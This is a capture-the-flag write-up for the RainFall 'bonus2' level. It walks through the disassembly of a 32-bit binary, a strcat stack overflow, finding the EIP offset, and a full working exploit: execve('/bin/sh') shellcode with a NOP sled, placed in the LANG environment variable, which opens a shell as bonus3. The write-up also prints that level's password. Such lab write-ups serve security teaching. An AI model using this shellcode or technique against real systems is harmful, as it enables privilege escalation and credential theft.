The program will take in 2 args and print `Hello $argv[1]`
We have 2 functions 
```
0x08048484  greetuser
0x08048529  main
```
main:
```
Dump of assembler code for function main:
   0x08048529 <+0>:	push   %ebp
   0x0804852a <+1>:	mov    %esp,%ebp
   0x0804852c <+3>:	push   %edi
   0x0804852d <+4>:	push   %esi
   0x0804852e <+5>:	push   %ebx
   0x0804852f <+6>:	and    $0xfffffff0,%esp
   0x08048532 <+9>:	sub    $0xa0,%esp -160 bytes local var
   0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    $0x1,%eax
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   <15> - <26>: If(argc != 3) return 1;
   0x08048548 <+31>:	lea    0x50(%esp),%ebx - load 80 bytes in ebx (local var)
   0x0804854c <+35>:	mov    $0x0,%eax - eax = 0
   0x08048551 <+40>:	mov    $0x13,%edx - edx = 19
   0x08048556 <+45>:	mov    %ebx,%edi - edi = ebx
   0x08048558 <+47>:	mov    %edx,%ecx - ecx = 19
   0x0804855a <+49>:	rep stos %eax,%es:(%edi)
   <31> - <49>: It fills a specified (ecx) amount of memory (at [edi]) with a given value (in eax).
   Functions as a memset, but instead of copying characters(1 byte), it will copy dword (4 byte), so in total 19*4 = 76 
   memset(buffer, 0, 76);
   0x0804855c <+51>:	mov    0xc(%ebp),%eax
   0x0804855f <+54>:	add    $0x4,%eax
   0x08048562 <+57>:	mov    (%eax),%eax
   0x08048564 <+59>:	movl   $0x28,0x8(%esp) - 40 for buf
   0x0804856c <+67>:	mov    %eax,0x4(%esp)
   0x08048570 <+71>:	lea    0x50(%esp),%eax
   0x08048574 <+75>:	mov    %eax,(%esp)
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   <51> - <78>: strncpy(buf, argv[1], 40);
   0x0804857c <+83>:	mov    0xc(%ebp),%eax
   0x0804857f <+86>:	add    $0x8,%eax
   0x08048582 <+89>:	mov    (%eax),%eax
   0x08048584 <+91>:	movl   $0x20,0x8(%esp) - +32 for buf
   0x0804858c <+99>:	mov    %eax,0x4(%esp)
   0x08048590 <+103>:	lea    0x50(%esp),%eax
   0x08048594 <+107>:	add    $0x28,%eax
   0x08048597 <+110>:	mov    %eax,(%esp)
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   <83> - <113>: strncpy(buf + 40, argv[2], 32);
   0x0804859f <+118>:	movl   $0x8048738,(%esp)
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
   <118> - <130>: env = getenv("LANG");
   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)
   0x080485ba <+145>:	je     0x8048618 <main+239>
   <130> - <145>: if (env != NULL) 
   0x080485bc <+147>:	movl   $0x2,0x8(%esp)
   0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
   0x080485cc <+163>:	mov    0x9c(%esp),%eax
   0x080485d3 <+170>:	mov    %eax,(%esp)
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   <147> - <173>: memcmp(env, "fi", 2);
   0x080485db <+178>:	test   %eax,%eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	movl   $0x1,0x8049988
   <147 - 182>: if (memcmp(env, "fi", 2) == 0) global language = 1
   0x080485e9 <+192>:	jmp    0x8048618 <main+239> - exit cond
   0x080485eb <+194>:	movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:	mov    0x9c(%esp),%eax
   0x08048602 <+217>:	mov    %eax,(%esp)
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   <192> - <220>: memcmp(env, "nl", 2)
   0x0804860a <+225>:	test   %eax,%eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	movl   $0x2,0x8049988
   0x08048618 <+239>:	mov    %esp,%edx
   <192> - <220>: if (memcmp(env, "nl", 2) == 0) global language = 2
   0x0804861a <+241>:	lea    0x50(%esp),%ebx ebx = buf
   0x0804861e <+245>:	mov    $0x13,%eax
   0x08048623 <+250>:	mov    %edx,%edi
   0x08048625 <+252>:	mov    %ebx,%esi
   0x08048627 <+254>:	mov    %eax,%ecx
   0x08048629 <+256>:	rep movsl %ds:(%esi),%es:(%edi)
   <241> - <256>: similar to the other rep instruction effectively just copying the buffer esp
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    -0xc(%ebp),%esp
   0x08048633 <+266>:	pop    %ebx
   0x08048634 <+267>:	pop    %esi
   0x08048635 <+268>:	pop    %edi
   0x08048636 <+269>:	pop    %ebp
   0x08048637 <+270>:	ret 
```
greetuser:
```
   0x08048484 <+0>:	push   %ebp
   0x08048485 <+1>:	mov    %esp,%ebp
   0x08048487 <+3>:	sub    $0x58,%esp
   0x0804848a <+6>:	mov    0x8049988,%eax - eax = language
   0x0804848f <+11>:	cmp    $0x1,%eax - if language == 1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
   0x08048494 <+16>:	cmp    $0x2,%eax - if language == 2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:	test   %eax,%eax - if language
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
   0x0804849d <+25>:	mov    $0x8048710,%edx - edx = "Hello "
   0x080484a2 <+30>:	lea    -0x48(%ebp),%eax - eax = buf
   0x080484a5 <+33>:	mov    (%edx),%ecx
   0x080484a7 <+35>:	mov    %ecx,(%eax) - (%edx) = (%eax)
   0x080484a9 <+37>:	movzwl 0x4(%edx),%ecx
   0x080484ad <+41>:	mov    %cx,0x4(%eax) 
   0x080484b1 <+45>:	movzbl 0x6(%edx),%edx
   0x080484b5 <+49>:	mov    %dl,0x6(%eax)
   <33> - <49>: ecx(4bytes) = "Hell", cx(2b) = "o ", dl(1b) = \0
   Manual copy of "Hello " in buf
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:	mov    $0x8048717,%edx - edx = "Hyvää päivää "
   0x080484bf <+59>:	lea    -0x48(%ebp),%eax - eax = buf
   0x080484c2 <+62>:	mov    (%edx),%ecx
   0x080484c4 <+64>:	mov    %ecx,(%eax) - (%edx) = (%eax)
   0x080484c6 <+66>:	mov    0x4(%edx),%ecx
   0x080484c9 <+69>:	mov    %ecx,0x4(%eax)
   <66> - <69>: Manual copy first 4 bytes in buf
   0x080484cc <+72>:	mov    0x8(%edx),%ecx
   0x080484cf <+75>:	mov    %ecx,0x8(%eax)
   0x080484d2 <+78>:	mov    0xc(%edx),%ecx
   0x080484d5 <+81>:	mov    %ecx,0xc(%eax)
   0x080484d8 <+84>:	movzwl 0x10(%edx),%ecx
   0x080484dc <+88>:	mov    %cx,0x10(%eax)
   0x080484e0 <+92>:	movzbl 0x12(%edx),%edx
   0x080484e4 <+96>:	mov    %dl,0x12(%eax)
   <66> - <96>: total 14 bytes copied in buf
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    $0x804872a,%edx - edx = "Goedemiddag! "
   0x080484ee <+106>:	lea    -0x48(%ebp),%eax - eax = buf
   0x080484f1 <+109>:	mov    (%edx),%ecx
   0x080484f3 <+111>:	mov    %ecx,(%eax)
   0x080484f5 <+113>:	mov    0x4(%edx),%ecx
   0x080484f8 <+116>:	mov    %ecx,0x4(%eax)
   0x080484fb <+119>:	mov    0x8(%edx),%ecx
   0x080484fe <+122>:	mov    %ecx,0x8(%eax)
   0x08048501 <+125>:	movzwl 0xc(%edx),%edx
   0x08048505 <+129>:	mov    %dx,0xc(%eax)
   <113> - <129>: total 14 bytes copied in buf
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    0x8(%ebp),%eax - eax = arg
   0x0804850d <+137>:	mov    %eax,0x4(%esp) 
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax
   0x08048514 <+144>:	mov    %eax,(%esp)
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   <134> - <147>: strcat(buf, arg);
   0x0804851c <+152>:	lea    -0x48(%ebp),%eax
   0x0804851f <+155>:	mov    %eax,(%esp)
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
   <152> - <158>: puts(buf);
   0x08048527 <+163>:	leave  
   0x08048528 <+164>:	ret  
```
The function will append with strcat to a fixed buffer, so maybe we are able to overwrite that
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7 Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac
Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7 Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac
Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAb9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac

Program received signal SIGSEGV, Segmentation fault.
0x41356341 in ?? ()
(gdb) i r
eax            0x5b	91
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff590	-1073744496
esp            0xbffff540	0xbffff540
ebp            0x34634133	0x34634133
esi            0xbffff5dc	-1073744420
edi            0xbffff58c	-1073744500
eip            0x41356341	0x41356341
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) p (char[4]) 0x41356341
$1 = "Ac5A"
```
We were able to overwrite the address of the eip. We found the offset of 18 in argv\[2].
Also we know that getenv() will take the memory address containg the string and place it on the stack. First we will export the payload and try to examine where the env sits in memory.
```
(gdb) i r ecx
ecx            0x804873a	134514490
(gdb) x /s 0x804873a
0x804873a:	 "NG"
(gdb) x /s 0xbffffee3
0xbffffee3:	 "NG=fi1\300\231Ph//shh/bin\211\343PS\211\341\260\v\315\200"
```
The payload will start after the "NG=fi" so our final address is 0xbffffee8.
```
(gdb) run $(python -c 'print "A"*40') $(python -c 'print 18 * "A" + "\xe8\xfe\xff\xbf"')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') $(python -c 'print 18 * "A" + "\xe8\xfe\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
process 4300 is executing new program: /bin/dash
$ 
[Inferior 1 (process 4300) exited normally]
(gdb) quit
bonus2@RainFall:~$ ./bonus2  $(python -c 'print "A"*40') $(python -c 'print 18 * "A" + "\xe8\xfe\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault (core dumped)
```
Seams to be working in gdb, but not when I run it normally. Maye we need more \NOP sleeds
```
bonus2@RainFall:~$ export LANG=$(python -c 'print "fi" + "\x90" * 100 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
bonus2@RainFall:~$ ./bonus2  $(python -c 'print "A"*40') $(python -c 'print 18 * "A" + "\xe8\xfe\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

